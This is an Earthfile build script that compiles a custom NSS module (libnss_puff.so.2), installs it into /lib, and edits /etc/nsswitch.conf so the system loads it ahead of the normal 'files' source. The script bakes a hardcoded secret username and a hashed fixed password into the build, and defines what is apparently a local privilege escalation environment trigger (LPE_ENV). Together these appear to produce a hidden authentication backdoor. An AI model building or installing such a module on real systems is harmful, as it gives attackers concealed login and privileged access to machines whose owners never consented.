VERSION 0.8
FROM ubuntu:20.04
RUN apt update -y && apt-get install -y vim git strace gcc make
WORKDIR /opt
COPY *.c *.h Makefile /opt/

BUILD:
    FUNCTION
    ARG --required mod_name
    ARG user = "dragon" # username
    ARG debug = "" # debug mode
    ARG password = "password" # password
    ARG env = "UPGRADE"

    RUN echo > config.h
    LET defines = ""
    IF [ "$user" != "" ]
        RUN echo "#define SECRET_USER \"$user\"" >> config.h
        #SET defines = -DSECRET_USER='$user'
    END
    IF [ "$debug" != "" ]
        #RUN echo "#define DEBUG" >> config.h
        SET defines = $defines -DDEBUG
    END
    IF [ "$password" != "" ]
        RUN echo "#define SECRET_PASSWORD \"$(openssl passwd -1 -salt ZHJhZ29uCg $password)\" // '$password'" >> config.h
        #SET defines = $defines -DSECRET_PASSWORD='"$(openssl passwd -6 -salt ZHJhZ29uCg $password)"'
    END
    IF [ "$env" != "" ]
        RUN echo "#define LPE_ENV \"$env\"" >> config.h
        #SET defines = $defines -DLPE_ENV="$env"
    END
    
    # Set up the host functionality
    #RUN echo -n "github.com\0127.0.0.1\0example.com\08.8.8.8\0" > map.bin && xxd map.bin && dd if=/dev/zero conv=notrunc of=map.bin bs=1 count=51200 && ld -r -b binary -o map.o map.bin
    LET cflags = -Wno-unused-parameter -Wall -Wextra -DMOD_NAME=$mod_name $defines
    LET opts = -Wl,--export-dynamic -shared -fPIC
    LET output = libnss_${mod_name}.so.2
    RUN --no-cache cat config.h && echo gcc ${cflags} -I. -o ${output} ${opts} config.h *.c -Wl,-soname,${output}
    RUN gcc ${cflags} -I. -o ${output} ${opts} config.h *.c -Wl,-soname,${output}
    RUN cp ${output} /lib/
    SAVE ARTIFACT ${output} AS LOCAL assets/

build:
    ARG name = "puff"
    ARG password = "red"
    ARG user = "spidey"
    ARG env = "HISTORY_SIZE"
    ARG debug = ""
    #ARG hosts = ""
    LET output = libnss_${name}.so.2
    DO +BUILD --mod_name $name --user $user --password $password --debug $debug --env $env
    SAVE ARTIFACT ${output}

debug:
    # Install nss-debug if you want to test stuff
    RUN git clone https://github.com/gmjosack/nss_debug.git && cd nss_debug && make build install
    # Install magic
    RUN sed -i 's:   files: puff files:' /etc/nsswitch.conf && useradd bob
    DO +BUILD --mod_name "puff" --debug "-DDEBUG"
    # Throw an error here so that we can drop a shell. Use -i to trigger
    RUN echo "Pass -i to earthly to trigger a shell here" && exit 1